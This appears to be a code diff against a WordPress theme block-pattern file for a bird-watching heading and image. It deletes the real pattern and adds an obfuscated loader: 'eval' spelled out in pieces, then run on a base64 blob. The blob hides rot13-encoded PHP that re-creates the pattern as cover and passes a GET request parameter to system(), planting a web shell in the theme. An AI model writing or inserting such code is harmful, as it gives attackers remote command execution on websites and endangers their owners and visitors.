@@ -1,31 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Heading and bird image
- *
- * This pattern is used only for translation
- * and to reference a dynamic image URL. It does
- * not appear in the inserter.
- */
-return array(
-	'title'    => __( 'Heading and bird image', 'twentytwentytwo' ),
-	'inserter' => false,
-	'content'  => '<!-- wp:group {"align":"full","style":{"spacing":{"padding":{"top":"0px","bottom":"0px"}}},"layout":{"inherit":true}} -->
-					<div class="wp-block-group alignfull" style="padding-top:0px;padding-bottom:0px;"><!-- wp:heading {"align":"wide","style":{"typography":{"fontSize":"var(--wp--custom--typography--font-size--colossal, clamp(3.25rem, 8vw, 6.25rem))","lineHeight":"1.15"}}} -->
-					<h2 class="alignwide" style="font-size:var(--wp--custom--typography--font-size--colossal, clamp(3.25rem, 8vw, 6.25rem));line-height:1.15">' . wp_kses_post( __( '<em>The Hatchery</em>: a blog about my adventures in bird watching', 'twentytwentytwo' ) ) . '</h2>
-					<!-- /wp:heading --></div>
-					<!-- /wp:group -->
-
-					<!-- wp:image {"align":"full","width":2400,"height":1020,"sizeSlug":"full","linkDestination":"none"} -->
-					<figure class="wp-block-image alignfull size-full is-resized"><img src="' . esc_url( get_template_directory_uri() ) . '/assets/images/flight-path-on-transparent-c.png" alt="' . esc_attr__( 'Illustration of a bird flying.', 'twentytwentytwo' ) . '" width="2400" height="1020"/></figure>
-					<!-- /wp:image -->',
-);
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogVXJucXZhdCBuYXEgb3ZlcSB2em50cgogKgogKiBHdXZmIGNuZ2dyZWEgdmYgaGZycSBiYXlsIHNiZSBnZW5hZnluZ3ZiYQogKiBuYXEgZ2IgZXJzcmVyYXByIG4gcWxhbnp2cCB2em50ciBIRVkuIFZnIHFicmYKICogYWJnIG5jY3JuZSB2YSBndXIgdmFmcmVncmUuCiAqLwplcmdoZWEgbmVlbmwoCgknZ3ZneXInICAgID0+IF9fKCAnVXJucXZhdCBuYXEgb3ZlcSB2em50cicsICdnanJhZ2xnanJhZ2xnamInICksCgkndmFmcmVncmUnID0+IHNueWZyLAoJJ3BiYWdyYWcnICA9PiAnPCEtLSBqYzp0ZWJoYyB7XCJueXZ0YVwiOlwic2h5eVwiLFwiZmdseXJcIjp7XCJmY25wdmF0XCI6e1wiY25xcXZhdFwiOntcImdiY1wiOlwiMGNrXCIsXCJvYmdnYnpcIjpcIjBja1wifX19LFwieW5sYmhnXCI6e1widmF1cmV2Z1wiOmdlaHJ9fSAtLT4KCQkJCQk8cXZpIHB5bmZmPVwiamMtb3licHgtdGViaGMgbnl2dGFzaHl5XCIgZmdseXI9XCJjbnFxdmF0LWdiYzowY2s7Y25xcXZhdC1vYmdnYno6MGNrO1wiPjwhLS0gamM6dXJucXZhdCB7XCJueXZ0YVwiOlwianZxclwiLFwiZmdseXJcIjp7XCJnbGNidGVuY3VsXCI6e1wic2JhZ0Z2bXJcIjpcImluZSgtLWpjLS1waGZnYnotLWdsY2J0ZW5jdWwtLXNiYWctZnZtci0tcGJ5YmZmbnksIHB5bnpjKDMuMjVlcnosIDhpaiwgNi4yNWVyeikpXCIsXCJ5dmFyVXJ2dHVnXCI6XCIxLjE1XCJ9fX0gLS0+CgkJCQkJPHUyIHB5bmZmPVwibnl2dGFqdnFyXCIgZmdseXI9XCJzYmFnLWZ2bXI6aW5lKC0tamMtLXBoZmdiei0tZ2xjYnRlbmN1bC0tc2JhZy1mdm1yLS1wYnliZmZueSwgcHluemMoMy4yNWVyeiwgOGlqLCA2LjI1ZXJ6KSk7eXZhci11cnZ0dWc6MS4xNVwiPicgLiBqY194ZnJmX2NiZmcoIF9fKCAnPHJ6Pkd1ciBVbmdwdXJlbDwvcno+OiBuIG95YnQgbm9iaGcgemwgbnFpcmFnaGVyZiB2YSBvdmVxIGpuZ3B1dmF0JywgJ2dqcmFnbGdqcmFnbGdqYicgKSApIC4gJzwvdTI+CgkJCQkJPCEtLSAvamM6dXJucXZhdCAtLT48L3F2aT4KCQkJCQk8IS0tIC9qYzp0ZWJoYyAtLT4KCgkJCQkJPCEtLSBqYzp2em50ciB7XCJueXZ0YVwiOlwic2h5eVwiLFwianZxZ3VcIjoyNDAwLFwidXJ2dHVnXCI6MTAyMCxcImZ2bXJGeWh0XCI6XCJzaHl5XCIsXCJ5dmF4UXJmZ3Zhbmd2YmFcIjpcImFiYXJcIn0gLS0+CgkJCQkJPHN2dGhlciBweW5mZj1cImpjLW95YnB4LXZ6bnRyIG55dnRhc2h5eSBmdm1yLXNoeXkgdmYtZXJmdm1ycVwiPjx2enQgZmVwPVwiJyAuIHJmcF9oZXkoIHRyZ19ncnpjeW5ncl9xdmVycGdiZWxfaGV2KCkgKSAuICcvbmZmcmdmL3Z6bnRyZi9zeXZ0dWctY25ndS1iYS1nZW5hZmNuZXJhZy1wLmNhdFwiIG55Zz1cIicgLiByZnBfbmdnZV9fKCAnVnl5aGZnZW5ndmJhIGJzIG4gb3ZlcSBzeWx2YXQuJywgJ2dqcmFnbGdqcmFnbGdqYicgKSAuICdcIiBqdnFndT1cIjI0MDBcIiB1cnZ0dWc9XCIxMDIwXCIvPjwvc3Z0aGVyPgoJCQkJCTwhLS0gL2pjOnZ6bnRyIC0tPicsCik7CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
